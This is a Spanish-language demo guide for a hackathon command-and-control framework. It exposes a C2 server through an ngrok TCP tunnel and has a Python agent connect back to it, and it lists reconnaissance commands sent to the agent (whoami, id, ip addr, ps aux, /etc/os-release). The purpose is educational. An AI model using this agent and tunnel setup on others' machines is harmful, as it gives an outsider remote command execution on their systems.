# 🎬 Demo Completa con ngrok

## Setup Completo

### Terminal 1: Servidor C2
```bash
cd /home/jose/ArchivoPortable/Hackatonn/aligo-c2-framework/server
python3 server.py
```

**Salida esperada:**
```
[*] Servidor C2 escuchando en 0.0.0.0:4444
Consola de operador. Comandos:
  list                -> lista agentes conectados
  use <agent_id> <cmd>  -> manda un comando a un agente
  exit                -> salir

> 
```

---

### Terminal 2: ngrok Tunnel
```bash
ngrok tcp 4444
```

**Salida esperada:**
```
Forwarding: tcp://0.tcp.ngrok.io:12345 -> localhost:4444
```

**📋 ANOTA ESTOS DATOS:**
- Host: `0.tcp.ngrok.io` (o similar)
- Puerto: `12345` (o el número que aparezca)

---

### Terminal 3 (o en otro equipo): Agente
```bash
cd /home/jose/ArchivoPortable/Hackatonn/aligo-c2-framework/agent

# Reemplaza con TU host y puerto de ngrok
python3 agent_ngrok.py 0.tcp.ngrok.io 12345
```

**Salida esperada:**
```
[*] Agente ID: agent-abc123
[*] Intentando conectar a 0.tcp.ngrok.io:12345
[+] ✅ Conectado al servidor como agent-abc123
```

---

### En el Servidor (Terminal 1):
```
> list
 - agent-abc123

> use agent-abc123 whoami
[enviado] id=xyz -> agent-abc123: whoami

[resultado de agent-abc123] (id=xyz):
jose

> use agent-abc123 hostname
[enviado] id=abc -> agent-abc123: hostname

[resultado de agent-abc123] (id=abc):
fedora

> use agent-abc123 uname -a
[resultado de agent-abc123]:
Linux fedora 7.0.12-101.fc43.x86_64 ...
```

---

## 🌐 Conexión desde Otra Red

Para demostrar el escenario realista (servidor y agente en redes diferentes):

### Opción A: Celular con Datos Móviles
1. Copia `agent_ngrok.py` a tu celular (Termux)
2. Instala Python en Termux
3. Ejecuta el agente con la URL de ngrok

### Opción B: Computador en Otra WiFi
1. Comparte `agent_ngrok.py` por USB/email
2. Conéctalo a otra WiFi (no la tuya)
3. Ejecuta con la URL de ngrok

### Opción C: Computador de un Compañero
1. Envía `agent_ngrok.py` por email/GitHub
2. Tu compañero lo ejecuta desde su red
3. Se conectará a través de internet

---

## 🎯 Comandos Demo para Impresionar

```bash
# Información del sistema
use agent-XXX uname -a
use agent-XXX cat /etc/os-release

# Información de red
use agent-XXX ip addr show
use agent-XXX hostname -I

# Procesos
use agent-XXX ps aux | head -20

# Archivos
use agent-XXX ls -la /tmp
use agent-XXX pwd

# Usuario
use agent-XXX whoami
use agent-XXX id
```

---

## 📊 Panel Web de ngrok

Mientras ngrok esté corriendo, puedes ver estadísticas en:

**http://127.0.0.1:4040**

Verás:
- Conexiones activas
- Tráfico en tiempo real
- Logs de requests
- Gráficas de latencia

---

## ⚠️ Notas Importantes

1. **La URL de ngrok cambia cada vez** que lo reinicias
   - Apúntala cada vez
   - Actualiza los agentes con la nueva URL

2. **Sesiones gratuitas duran 2 horas**
   - Puedes reconectar sin límite
   - Solo cierra y vuelve a abrir ngrok

3. **Un agente a la vez** en plan gratuito
   - Múltiples agentes pueden conectarse al servidor
   - ngrok gratis permite 1 túnel activo

4. **Latencia**
   - Será mayor que en red local (normal)
   - Depende de la ubicación del servidor ngrok

---

## 🔧 Troubleshooting

### "No connection could be made"
- Verifica que el servidor esté corriendo
- Verifica que ngrok esté activo
- Copia bien la URL (sin espacios extra)

### "Connection timeout"
- Verifica tu internet
- Intenta reiniciar ngrok
- Verifica que el puerto sea correcto

### ngrok se cierra solo
- Sesión de 2h expiró
- Vuelve a ejecutar `ngrok tcp 4444`
- Actualiza los agentes con la nueva URL

### El agente se conecta pero no responde
- Verifica que los comandos sean válidos
- Algunos comandos requieren permisos especiales
- Timeout de 30s por comando

---

## ✅ Checklist Pre-Demo

- [ ] Servidor corriendo
- [ ] ngrok activo con túnel TCP
- [ ] URL y puerto de ngrok anotados
- [ ] Al menos 1 agente conectado
- [ ] Comandos de prueba funcionando
- [ ] Panel web de ngrok abierto (opcional pero cool)

---

## 🎬 Script de Presentación Sugerido

"Voy a demostrar un sistema C2 realista donde el servidor está en una red y el agente en otra completamente diferente, simulando un escenario real de seguridad."

1. Mostrar servidor corriendo
2. Mostrar túnel ngrok (explicar que expone el servidor a internet)
3. Conectar agente desde otra red/dispositivo
4. Ejecutar `list` para mostrar agente conectado
5. Ejecutar comandos de demo
6. Mostrar panel de ngrok con estadísticas en vivo

"Como pueden ver, el agente puede estar en cualquier parte del mundo y sigue conectándose al servidor C2 a través de internet, similar a como operan las amenazas reales."
